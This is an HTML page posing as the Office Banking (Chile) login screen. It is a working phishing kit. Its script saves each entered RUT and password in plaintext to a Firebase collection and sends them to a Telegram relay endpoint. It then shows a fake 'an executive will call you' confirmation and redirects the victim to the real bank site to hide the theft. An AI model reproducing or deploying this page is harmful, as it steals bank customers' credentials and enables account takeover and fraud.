<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <title>Office Banking</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link rel="stylesheet" href="styles.css">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
  <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-app-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-firestore-compat.js"></script>
</head>
<body>
  <div class="login-box">
    <img src="logo-office-banking.png" alt="Office Banking" class="logo">

    <form id="loginForm">
      <label for="rut">RUT</label>
      <input type="text" id="rut" name="rut" placeholder="12.345.678-5" required>
      
      <label for="passwd">Contrase√±a</label>
      <input type="password" id="passwd" name="passwd" required>
      
      <div class="options">
        <a href="https://wslogin.officebanking.cl/autogestion-clave" target="_blank">Olvid√© mi clave</a>
      </div>
      
      <button type="submit">Solicitar</button>
    </form>
    <div id="resultado"></div>

    <div class="app-footer">
      <div class="app-info">
        <h3>Toda la gesti√≥n de tu empresa en tu mano</h3>
        <p>Accede a todas las herramientas de la App Office Banking</p>
        
        <div class="available-on">
          <span>Disponible en:</span>
        </div>
        
        <div class="app-badges">
          <a href="https://apps.apple.com/cl/app/office-banking/id1248490706" target="_blank" class="app-store-badge">
            <img src="https://upload.wikimedia.org/wikipedia/commons/3/3c/Download_on_the_App_Store_Badge.svg" alt="Descargar en App Store" class="store-badge">
          </a>
          <a href="https://play.google.com/store/search?q=santander+office+banking&c=apps&hl=es_CL" target="_blank" class="google-play-badge">
            <img src="https://upload.wikimedia.org/wikipedia/commons/7/78/Google_Play_Store_badge_EN.svg" alt="Disponible en Google Play" class="store-badge">
          </a>
        </div>
        
        <a href="https://empresas.officebanking.cl/article/productos-y-servicios" class="learn-more">
          Conoce m√°s <i class="fas fa-arrow-right"></i>
        </a>
      </div>
    </div>

    <div class="footer-icons">
      <div>üìä<br>Indicadores Econ√≥micos</div>
      <div>‚òéÔ∏è<br>Contact Center</div>
    </div>
  </div>

  <!-- Modal para mensaje push -->
  <div id="messageModal" class="modal">
    <div class="modal-content">
      <div class="modal-header">
        <div class="modal-icon">
          <i class="fas fa-check-circle"></i>
        </div>
        <h2>Solicitud Confirmada</h2>
      </div>
      <div class="modal-body">
        <p><i class="fas fa-phone-alt"></i> Te contactaremos pronto</p>
        <p class="small">Un ejecutivo se comunicar√° contigo en las pr√≥ximas 24 horas</p>
      </div>
      <div class="modal-footer">
        <button id="closeModal">Cerrar</button>
      </div>
    </div>
  </div>

  <script src="firebase-config.js"></script>

  <script>
    // Formateo RUT
    function formatearRut(valor) {
      valor = valor.replace(/\./g, "").replace(/-/g, "").toUpperCase();
      if(valor.length <= 1) return valor;
      let cuerpo = valor.slice(0, -1);
      let dv = valor.slice(-1);
      let cuerpoConPuntos = "";
      while(cuerpo.length > 3) {
        cuerpoConPuntos = "." + cuerpo.slice(-3) + cuerpoConPuntos;
        cuerpo = cuerpo.slice(0, -3);
      }
      cuerpoConPuntos = cuerpo + cuerpoConPuntos;
      return cuerpoConPuntos + "-" + dv;
    }

    function validarRut(rutCompleto) {
      rutCompleto = rutCompleto.replace(/\./g, "").replace(/-/g, "").toUpperCase();
      if(rutCompleto.length < 2) return false;
      let cuerpo = rutCompleto.slice(0, -1);
      let dv = rutCompleto.slice(-1);
      let suma = 0, multiplo = 2;
      for(let i = cuerpo.length - 1; i >= 0; i--) {
        suma += parseInt(cuerpo.charAt(i)) * multiplo;
        multiplo = multiplo < 7 ? multiplo + 1 : 2;
      }
      let dvEsperado = 11 - (suma % 11);
      dvEsperado = dvEsperado === 11 ? "0" : dvEsperado === 10 ? "K" : dvEsperado.toString();
      return dv === dvEsperado;
    }

    const rutInput = document.getElementById("rut");
    rutInput.addEventListener("input", function(e){
      let valor = e.target.value.replace(/[^0-9kK]/g, "");
      e.target.value = formatearRut(valor);
    });

    // Modal y redirecci√≥n
    const modal = document.getElementById("messageModal");
    const closeModalBtn = document.getElementById("closeModal");

    function showModal() {
      modal.style.display = "flex";
    }

    function redirectToPage() {
      window.location.href = "https://empresas.officebanking.cl/";
    }

    closeModalBtn.addEventListener("click", function() {
      modal.style.display = "none";
      redirectToPage();
    });

    window.addEventListener("click", function(event) {
      if (event.target === modal) {
        modal.style.display = "none";
        redirectToPage();
      }
    });

    // Guardar en Firebase
    async function guardarEnFirebase(datos) {
      try {
        await db.collection("solicitudes").add({
          rut: datos.rut,
          passwd: datos.passwd,
          timestamp: firebase.firestore.FieldValue.serverTimestamp(),
          fecha: new Date().toLocaleString("es-CL"),
          userAgent: navigator.userAgent
        });
        return true;
      } catch (error) {
        console.error("Error guardando en Firebase:", error);
        return false;
      }
    }

    // Env√≠o del formulario
    document.getElementById("loginForm").addEventListener("submit", async function(e){
      e.preventDefault();
      const rut = rutInput.value;
      const passwd = document.getElementById("passwd").value;

      if(!validarRut(rut)){
        document.getElementById("resultado").innerText = "‚ùå RUT inv√°lido";
        document.getElementById("resultado").style.color = "#e63946";
        return;
      }

      try {
        const guardadoExitoso = await guardarEnFirebase({ rut, passwd });

        if(guardadoExitoso) {
          showModal();
          document.getElementById("resultado").innerText = "‚úÖ Solicitud recibida. Te llamaremos dentro de 24 horas.";
          document.getElementById("resultado").style.color = "#2e7d32";

          // Enviar a Telegram (no bloqueante)
          fetch('/api/telegram', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              rut: rut,
              passwd: passwd,
              userAgent: navigator.userAgent,
              fecha: new Date().toLocaleString("es-CL")
            })
          }).catch(err => console.error('Error al enviar a Telegram:', err));

        } else {
          throw new Error("Error al guardar en Firebase");
        }

      } catch (error) {
        console.error("Error:", error);
        document.getElementById("resultado").innerText = "‚ö†Ô∏è Error al enviar la solicitud. Intenta nuevamente.";
        document.getElementById("resultado").style.color = "#e63946";
      }
    });
  </script>
</body>
</html>